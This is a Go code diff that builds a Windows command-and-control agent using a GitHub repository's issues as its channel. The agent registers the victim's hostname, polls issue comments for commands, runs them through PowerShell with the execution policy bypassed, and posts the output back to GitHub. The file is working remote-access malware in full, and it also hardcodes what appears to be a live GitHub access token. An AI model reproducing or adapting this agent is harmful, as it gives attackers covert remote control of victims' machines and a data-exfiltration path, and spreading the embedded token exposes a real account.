@@ -5,163 +5,248 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
+	"os"
 	"os/exec"
+	"os/signal"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
+
+	"github.com/google/uuid"
+	"golang.org/x/sys/windows"
 )
 
-// GitHub settings
 const (
-	repoOwner = ""// Change to your GitHub username/org
-	repoName  = ""// Change to your repo name
-	token     = ""// HARDCODED TOKEN (Replace with your token)
-	apiURL    = "https://api.github.com"
+	githubToken = "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" // 🔒 Replace with your GitHub Token
+	repoName    = "CaptShiva007/C2-Channel"                                                                       // 🔒 Replace with your GitHub Repo
 )
 
-// Structs for GitHub API response
-type Issue struct {
-	Number int    `json:"number"`
-	Title  string `json:"title"`
-	Body   string `json:"body"`
+var (
+	agentID     string
+	issueNumber int
+	jobHandle   windows.Handle
+)
+
+// **1️⃣ Create Windows Job Object with Termination Monitoring**
+func createJobObject() {
+	var err error
+	jobHandle, err = windows.CreateJobObject(nil, nil)
+	if err != nil {
+		log.Fatalf("❌ Failed to create job object: %v", err)
+	}
+
+	// **Enforce process termination when job object is closed**
+	var info windows.JOBOBJECT_EXTENDED_LIMIT_INFORMATION
+	info.BasicLimitInformation.LimitFlags = windows.JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE
+	_, err = windows.SetInformationJobObject(jobHandle, windows.JobObjectExtendedLimitInformation, uintptr(unsafe.Pointer(&info)), uint32(unsafe.Sizeof(info)))
+	if err != nil {
+		log.Fatalf("❌ Failed to set job object information: %v", err)
+	}
+
+	// Assign the current process to the job object
+	self, err := windows.GetCurrentProcess()
+	if err != nil {
+		log.Fatalf("❌ Failed to get current process: %v", err)
+	}
+
+	err = windows.AssignProcessToJobObject(jobHandle, self)
+	if err != nil {
+		log.Fatalf("❌ Failed to assign process to job object: %v", err)
+	}
+
+	fmt.Println("🔒 Agent is now protected by a Windows Job Object.")
 }
 
-type Comment struct {
-	Body string `json:"body"`
+// **2️⃣ Register Agent with GitHub**
+func registerAgent() {
+	hostname, _ := os.Hostname()
+	agentID = uuid.New().String() // Generate a unique ID
+
+	// Create an issue on GitHub
+	payload := map[string]string{
+		"title": fmt.Sprintf("Agent Registered: %s | %s", hostname, agentID),
+		"body":  "Agent is now active and awaiting commands.",
+	}
+	issueNumber = createGitHubIssue(payload)
+
+	if issueNumber == 0 {
+		log.Fatal("❌ Failed to register agent.")
+	}
+	fmt.Printf("✅ Agent Registered: %s | %s\n", hostname, agentID)
 }
 
-type IssueUpdate struct {
-	State string `json:"state"`
-}
-
-// Fetch the latest open issue
-func getLatestIssue() (Issue, error) {
-	url := fmt.Sprintf("%s/repos/%s/%s/issues?state=open&per_page=1", apiURL, repoOwner, repoName)
-
-	req, _ := http.NewRequest("GET", url, nil)
-	req.Header.Set("Authorization", "token "+token)
+// **3️⃣ Create GitHub Issue**
+func createGitHubIssue(payload map[string]string) int {
+	url := fmt.Sprintf("https://api.github.com/repos/%s/issues", repoName)
+	data, _ := json.Marshal(payload)
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	req.Header.Set("Authorization", "token "+githubToken)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
 
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		return Issue{}, err
+		log.Println("❌ Failed to create issue:", err)
+		return 0
 	}
 	defer resp.Body.Close()
 
-	// Read the response body
-	body, _ := ioutil.ReadAll(resp.Body)
-	fmt.Println("GitHub API Response:", string(body)) // DEBUG: Print full response
-
-	// Check if response is empty or unauthorized
-	if resp.StatusCode != 200 {
-		return Issue{}, fmt.Errorf("GitHub API error: %s", resp.Status)
+	if resp.StatusCode == http.StatusCreated {
+		body, _ := ioutil.ReadAll(resp.Body)
+		var result map[string]interface{}
+		json.Unmarshal(body, &result)
+		return int(result["number"].(float64))
 	}
-
-	// Parse the JSON response
-	var issues []Issue
-	err = json.Unmarshal(body, &issues)
-	if err != nil {
-		return Issue{}, err
-	}
-
-	if len(issues) == 0 {
-		return Issue{}, fmt.Errorf("no open issues found")
-	}
-
-	return issues[0], nil
+	log.Println("❌ GitHub issue creation failed. Status:", resp.Status)
+	return 0
 }
 
-// Execute the command from the issue title
-func executeCommand(command string) string {
-	cmd := exec.Command("cmd", "/c", command) // Windows
-	// cmd := exec.Command("bash", "-c", command) // Linux/macOS [we'll do that later]
+// **4️⃣ Fetch & Execute Commands from GitHub**
+var lastProcessedCommentID int
 
-	out, err := cmd.CombinedOutput()
-	if err != nil {
-		return fmt.Sprintf("Error executing: %s\n%s", command, err.Error())
+func executeCommands() {
+	for {
+		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
+		req, _ := http.NewRequest("GET", url, nil)
+		req.Header.Set("Authorization", "token "+githubToken)
+		req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Println("❌ Failed to fetch commands:", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		if resp.StatusCode == http.StatusOK {
+			body, _ := ioutil.ReadAll(resp.Body)
+			var comments []map[string]interface{}
+			json.Unmarshal(body, &comments)
+
+			// Process only new comments
+			for _, comment := range comments {
+				commentID := int(comment["id"].(float64))
+				commentBody := comment["body"].(string)
+
+				// Ignore already processed comments
+				if commentID <= lastProcessedCommentID {
+					continue
+				}
+
+				lastProcessedCommentID = commentID // Update last processed comment ID
+
+				// Check if the comment is a command
+				if strings.HasPrefix(commentBody, "Command: ") {
+					extractedCommand := strings.TrimPrefix(commentBody, "Command: ")
+					fmt.Printf("✅ Extracted Command: %s\n", extractedCommand)
+					executeCommand(extractedCommand)
+				} else {
+					fmt.Printf("⚠ Ignoring response comment.\n")
+				}
+			}
+		}
+
+		time.Sleep(5 * time.Second) // Poll every 5 seconds
 	}
-	return string(out)
 }
 
-// Post command output as a comment
-func postComment(issueNumber int, output string) error {
-	url := fmt.Sprintf("%s/repos/%s/%s/issues/%d/comments", apiURL, repoOwner, repoName, issueNumber)
+// **5️⃣ Execute the Received Command (PowerShell)**
+func executeCommand(command string) {
+	fmt.Printf("⚡ Executing: %s\n", command)
 
-	comment := Comment{Body: fmt.Sprintf("```\n%s\n```", output)}
-	jsonData, _ := json.Marshal(comment)
+	// Ensure proper encoding to capture single-line outputs like `whoami`
+	cmdStr := strings.TrimSpace(strings.TrimPrefix(command, "Command: "))
+	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
+		"-Command", fmt.Sprintf("[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; %s", cmdStr))
 
-	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
-	req.Header.Set("Authorization", "token "+token)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
+
+	err := cmd.Run()
+	output := out.String()
+
+	if err != nil {
+		output += fmt.Sprintf("\n❌ Execution failed: %v", err)
+	}
+
+	// Prevent empty responses from being sent
+	if strings.TrimSpace(output) == "" {
+		output = "(No Output)"
+	}
+
+	// Send output as a comment on GitHub
+	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
+	commentPayload := map[string]string{"body": fmt.Sprintf("```\n%s\n```", output)}
+	data, _ := json.Marshal(commentPayload)
+
+	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
+	req.Header.Set("Authorization", "token "+githubToken)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{}
-	resp, err := client.Do(req)
+	_, err = client.Do(req)
 	if err != nil {
-		return err
+		log.Println("❌ Failed to send command output:", err)
 	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 201 {
-		return fmt.Errorf("failed to post comment, status: %d", resp.StatusCode)
-	}
-
-	return nil
 }
 
-// Close the issue after execution
-func closeIssue(issueNumber int) error {
-	url := fmt.Sprintf("%s/repos/%s/%s/issues/%d", apiURL, repoOwner, repoName, issueNumber)
+// **6️⃣ Handle Exit & Cleanup**
+func cleanup() {
+	if issueNumber != 0 {
+		fmt.Println("🔴 Agent received termination signal. Shutting down...")
 
-	update := IssueUpdate{State: "closed"}
-	jsonData, _ := json.Marshal(update)
+		// Send termination update
+		url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d/comments", repoName, issueNumber)
+		commentPayload := map[string]string{"body": fmt.Sprintf("Agent [%s] received termination signal. Shutting down...", agentID)}
+		data, _ := json.Marshal(commentPayload)
 
-	req, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(jsonData))
-	req.Header.Set("Authorization", "token "+token)
+		req, _ := http.NewRequest("POST", url, bytes.NewBuffer(data))
+		req.Header.Set("Authorization", "token "+githubToken)
+		req.Header.Set("Accept", "application/vnd.github.v3+json")
+
+		client := &http.Client{}
+		client.Do(req) // Send shutdown message
+
+		// Close the issue
+		closeIssue()
+	}
+}
+
+// **7️⃣ Close the GitHub Issue**
+func closeIssue() {
+	url := fmt.Sprintf("https://api.github.com/repos/%s/issues/%d", repoName, issueNumber)
+	payload := map[string]string{"state": "closed"}
+	data, _ := json.Marshal(payload)
+
+	req, _ := http.NewRequest("PATCH", url, bytes.NewBuffer(data))
+	req.Header.Set("Authorization", "token "+githubToken)
 	req.Header.Set("Accept", "application/vnd.github.v3+json")
-	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{}
-	resp, err := client.Do(req)
+	_, err := client.Do(req)
 	if err != nil {
-		return err
+		log.Println("❌ Failed to close the issue:", err)
+	} else {
+		fmt.Println("✅ Issue closed successfully.")
 	}
-	defer resp.Body.Close()
-
-	if resp.StatusCode != 200 {
-		return fmt.Errorf("failed to close issue, status: %d", resp.StatusCode)
-	}
-
-	return nil
 }
 
 func main() {
-	for {
-		issue, err := getLatestIssue()
-		if err != nil {
-			fmt.Println("Error fetching issue:", err)
-			time.Sleep(10 * time.Second)
-			continue
-		}
+	createJobObject()
+	registerAgent()
 
-		command := strings.TrimPrefix(issue.Title, "Command: ")
-		fmt.Println("Executing:", command)
+	signalChannel := make(chan os.Signal, 1)
+	signal.Notify(signalChannel, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-signalChannel
+		cleanup()
+		os.Exit(0)
+	}()
 
-		output := executeCommand(command)
-
-		// Post output as a comment
-		if err := postComment(issue.Number, output); err != nil {
-			fmt.Println("Error posting comment:", err)
-		}
-
-		// Close the issue
-		if err := closeIssue(issue.Number); err != nil {
-			fmt.Println("Error closing issue:", err)
-		} else {
-			fmt.Println("Issue closed successfully.")
-		}
-
-		time.Sleep(20 * time.Second) // Adjust based on need
-	}
+	executeCommands()
 }
